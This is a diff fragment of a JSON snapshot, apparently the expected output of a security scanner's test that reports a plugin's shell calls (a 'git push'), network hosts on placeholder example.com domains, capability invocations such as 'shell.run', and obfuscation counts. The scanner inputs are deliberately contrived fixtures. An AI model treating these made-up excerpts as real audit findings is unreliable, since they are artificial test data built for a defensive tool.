+    "coverage": {
+     "filesTotal": 3,
+     "filesScanned": 3,
+     "bytesScanned": 1427,
+     "skipped": [],
+     "truncated": false,
+     "timedOut": false
+    },
+    "shell": {
+     "calls": [
+      {
+       "executable": "git",
+       "subcommand": "push",
+       "category": "remoteWrite",
+       "source": "frontend",
+       "evidence": "callSite",
+       "files": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 8,
+         "col": 5,
+         "excerpt": "'git push'"
+        }
+       ]
+      }
+     ],
+     "dynamic": {
+      "count": 0,
+      "files": 0
+     }
+    },
+    "network": {
+     "hosts": [
+      {
+       "host": "far.example.com",
+       "source": "frontend",
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 10,
+         "col": 373,
+         "excerpt": "= 1;z = 1;z = 1;z = 1;z = 1;const far = 'https://far.example.com/' + 'wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww"
+        }
+       ]
+      },
+      {
+       "host": "many.example.com",
+       "source": "frontend",
+       "count": 5,
+       "sites": [
+        {
+         "file": "frontend/a.js",
+         "line": 2,
+         "col": 13,
+         "excerpt": "const a = 'https://many.example.com/1';"
+        },
+        {
+         "file": "frontend/a.js",
+         "line": 4,
+         "col": 8,
+         "excerpt": "fetch(\"https://many.example.com/2\")"
+        },
+        {
+         "file": "frontend/a.js",
+         "line": 5,
+         "col": 3,
+         "excerpt": "x('https://many.example.com/3'); y('https://many.example.com/4')"
+        }
+       ]
+      },
+      {
+       "host": "near-secret.example.com",
+       "source": "frontend",
+       "count": 1,
+       "sites": [
+        {
+         "file": "frontend/c.js",
+         "line": 1,
+         "col": 211,
+         "excerpt": null
+        }
+       ]
+      }
+     ]
+    },
+    "files": {
+     "readPaths": [],
+     "writePaths": [],
+     "dynamicPaths": 0
+    },
+    "capabilities": [
+     {
+      "address": "shell.run",
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/a.js",
+        "line": 6,
+        "col": 8,
+        "excerpt": "invoke('shell.run', {"
+       }
+      ]
+     },
+     {
+      "address": "storage.get",
+      "source": "frontend",
+      "sites": [
+       {
+        "file": "frontend/b.js",
+        "line": 1,
+        "col": 41,
+        "excerpt": "'https://many.example.com/0'; 😀😀 invoke('storage.get', {key: 'k'})"
+       }
+      ]
+     }
+    ],
+    "code": {
+     "frontend": {
+      "eval": 0,
+      "newFunction": 0,
+      "dynamicImport": 0,
+      "stringTimers": 0,
+      "obfuscationSignals": []
+     },
+     "backend": null
+    },
+    "native": []
    }
   },
   {
